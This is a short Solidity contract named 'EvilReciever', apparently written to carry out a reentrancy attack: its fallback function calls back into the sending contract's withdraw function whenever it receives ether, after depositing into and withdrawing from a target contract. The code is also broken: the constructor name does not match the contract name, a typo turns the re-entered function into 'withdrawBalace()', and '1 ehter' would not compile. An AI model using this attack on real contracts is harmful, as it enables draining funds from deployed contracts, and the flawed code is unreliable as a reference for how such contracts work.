pragma solidity ^0.4.11;
contract EvilReciever {
  address public target;

  event MessageLog(string);

  event BalanceLog(uint);

  function EvilReceiver(address _target) {
    target = _target;
  }

  function() payable{
    BalanceLog(this.balance);

    if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalace()")))) {
      MessageLog("FAIL");
    } else {
      MessageLog("SUCCESS");
    }
  }

  function addBalace() public payable {
  }

  function sendEhtToTarget() public {
    if(!target.call.value(1 ehter)(bytes4(sha3("addToBalance()")))) {throw;}
  }

  function withdraw() public {
    if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))) {throw;}
  }
}

